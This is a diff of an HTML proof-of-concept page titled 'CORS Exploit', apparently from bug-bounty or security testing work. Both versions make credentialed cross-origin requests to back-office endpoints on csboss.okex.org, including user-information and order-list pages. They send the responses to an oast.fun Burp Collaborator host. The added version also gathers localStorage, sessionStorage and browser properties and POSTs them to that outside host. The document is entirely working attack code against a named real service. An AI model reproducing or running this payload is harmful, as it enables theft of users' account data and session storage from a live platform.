@@ -1,60 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JustLow.</title>
+    <title>CORS Exploit</title>
 </head>
 <body>
     <script>
-        // Function to log response data to Burp Collaborator
-        function logResponse(response) {
-            fetch('https://pivmfpvbddwuickccewrjwstjg5xiimw2.oast.fun/log?key=' + response);
-        }
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Retrieve local storage and session storage data
+                var localStorageData = JSON.stringify(localStorage);
+                var sessionStorageData = JSON.stringify(sessionStorage);
 
-        // XMLHttpRequest for Target URL 1
-        var xhr1 = new XMLHttpRequest();
-        xhr1.onreadystatechange = function() {
-            if (xhr1.readyState === 4) {
-                logResponse(xhr1.responseText);
+                // Get all headers from the user's browser
+                var headers = {};
+                for (var header in navigator) {
+                    if (typeof navigator[header] === 'string') {
+                        headers[header] = navigator[header];
+                    }
+                }
+
+                // Send the response, local storage/session storage data, and headers to Burp Collaborator
+                fetch('https://pivmfpvbddwuickccewrjwstjg5xiimw2.oast.fun', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        response: xhr.responseText,
+                        localStorageData: localStorageData,
+                        sessionStorageData: sessionStorageData,
+                        headers: headers
+                    })
+                });
             }
         };
-        xhr1.open('GET', 'https://csboss.okex.org/newboss/home', true);
-        xhr1.withCredentials = true;
-        xhr1.send();
-
-        // XMLHttpRequest for Target URL 2
-        var xhr2 = new XMLHttpRequest();
-        xhr2.onreadystatechange = function() {
-            if (xhr2.readyState === 4) {
-                logResponse(xhr2.responseText);
-            }
-        };
-        xhr2.open('GET', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=46334716', true);
-        xhr2.withCredentials = true;
-        xhr2.send();
-
-        // XMLHttpRequest for Target URL 3
-        var xhr3 = new XMLHttpRequest();
-        xhr3.onreadystatechange = function() {
-            if (xhr3.readyState === 4) {
-                logResponse(xhr3.responseText);
-            }
-        };
-        xhr3.open('GET', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll', true);
-        xhr3.withCredentials = true;
-        xhr3.send();
-
-        // XMLHttpRequest for Target URL 4
-        var xhr4 = new XMLHttpRequest();
-        xhr4.onreadystatechange = function() {
-            if (xhr4.readyState === 4) {
-                logResponse(xhr4.responseText);
-            }
-        };
-        xhr4.open('GET', 'https://csboss.okex.org/newboss/otc/open/orderList/', true);
-        xhr4.withCredentials = true;
-        xhr4.send();
+        xhr.open('GET', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=46334716', true);
+        xhr.withCredentials = true; // Include cookies in the request if needed
+        xhr.send();
     </script>
 </body>
 </html>
